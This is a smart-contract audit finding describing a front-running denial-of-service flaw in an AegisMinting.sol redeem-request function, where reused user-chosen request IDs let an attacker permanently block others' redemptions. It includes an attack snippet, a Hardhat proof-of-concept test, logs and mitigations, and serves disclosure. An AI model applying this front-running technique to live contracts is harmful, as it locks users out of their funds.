# Front-Running redeem request with same request Id blocks legitimate redeems

## Summary:

The `requestRedeem` function in `AegisMinting.sol` has a vulnerability where request IDs can be front-run and permanently blocked, preventing legitimate users from creating redeem requests. The issue stems from not properly handling request ID reuse and not clearing request data after completion.

## Vulnerability Details:

The vulnerability occurs in the [`requestRedeem`](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L277) function where:

1. The request ID is derived from `order.additionalData` which can be controlled by users
2. Once a request ID is used, its timestamp is never reset to 0 even after the request is completed (approved/rejected/withdrawn)
3. The function reverts if it finds a request with non-zero timestamp for the same ID

An attacker can:

- Monitor pending transactions for redeem requests
- Front-run them by submitting a transaction with the same request ID with 1 wei YUSD amount
- The transaction will succeed and block the original request
- The original transaction will revert because the request ID already exists with a non-zero timestamp
- This permanently blocks that request ID since:
  - The timestamp will be set to block.timestamp
  - Future attempts to use the same ID will fail due to the timestamp check
  - The timestamp is never cleared

## Impact:

- Legitimate users can have their redeem requests permanently blocked
- Attackers can systematically block all redeem requests by front-running
- Loss of user funds as they cannot redeem their YUSD tokens
- Degradation of protocol functionality and user trust

## Proof of Concept:

1. Alice prepares a redeem request with request ID "alice-123"
2. Attacker sees this in mempool and quickly sends:

```solidity
redeemOrder({
  ...,
  additionalData: abi.encode("alice-123"),
  yusdAmount: 1 wei
})
```

3. Alice's transaction now fails because request ID "alice-123" already exists
4. The request remains blocked forever since the timestamp is never reset

### Proof Of Code:

1. Add the following code to `6_aegis_minting_redeem_spec.ts` in `test` directory:
2. Run the test using the command `npx hardhat test`

```ts
it.only("Front running redeemRequest to block legitimate redeem requests", async () => {
  const [owner, alice, attacker] = await ethers.getSigners();

  const {
    aegisMintingContract,
    aegisMintingAddress,
    assetAddress,
    yusdContract,
    aegisConfig,
  } = await loadFixture(deployFixture);

  await aegisConfig["whitelistAddress(address,bool)"](attacker, true);
  await aegisConfig["whitelistAddress(address,bool)"](alice, true);

  await yusdContract.setMinter(owner);
  await yusdContract.mint(alice, ethers.parseEther("100"));
  await yusdContract.mint(attacker, "1");
  await yusdContract.setMinter(aegisMintingAddress);
  // Approve YUSD to be sent by AegisMinting contract from sender
  await yusdContract
    .connect(alice)
    .approve(aegisMintingAddress, ethers.parseEther("1000"));
  await yusdContract
    .connect(attacker)
    .approve(aegisMintingAddress, ethers.parseEther("1000"));

  // request id of alice
  const requestId = "alice-123";
  const collateralAmount = ethers.parseEther("10");
  const yusdAmount = ethers.parseEther("9.99");
  const redeemOrder_1 = {
    orderType: OrderType.REDEEM,
    userWallet: alice.address,
    collateralAsset: assetAddress,
    collateralAmount: collateralAmount,
    yusdAmount: yusdAmount,
    slippageAdjustedAmount: yusdAmount,
    expiry: (await time.latest()) + 10000,
    nonce: Date.now(),
    additionalData: encodeString(requestId),
  };
  const redeemOrder_2 = {
    orderType: OrderType.REDEEM,
    userWallet: attacker.address,
    collateralAsset: assetAddress,
    collateralAmount: 1,
    yusdAmount: 1,
    slippageAdjustedAmount: 0,
    expiry: (await time.latest()) + 10000,
    nonce: Date.now(),
    additionalData: encodeString(requestId),
  };
  const signature = await signOrder(redeemOrder_1, aegisMintingAddress);
  const signature_2 = await signOrder(redeemOrder_2, aegisMintingAddress);

  console.log(
    "Attacker front runs the legitimate redeem request with requestId:",
    requestId
  );

  // Attacker redeemRequest
  await aegisMintingContract
    .connect(attacker)
    .requestRedeem(redeemOrder_2, signature_2);

  console.log(
    "Now users redeem goes through with same requestId:",
    requestId,
    "and reverts"
  );

  // Alice redeemRequest is reverted with InvalidRedeemRequest
  await expect(
    aegisMintingContract.connect(alice).requestRedeem(redeemOrder_1, signature)
  ).to.be.revertedWithCustomError(aegisMintingContract, "InvalidRedeemRequest");
});
```

**Logs**

```ts
Attacker front runs the legitimate redeem request with requestId: alice-123
Now alice's redeem goes through with same requestId: alice-123 and reverts
        âœ” Front running redeemRequest to block legitimate redeem requests (1509ms)
```

## Recommended Mitigation:

1. Reset request timestamp to 0 when request is completed (approved/rejected/withdrawn):
2. Consider using a different request ID scheme that:

   - Is not user-controllable (e.g., auto-incrementing counter)
   - Or uses user address + nonce to prevent collisions
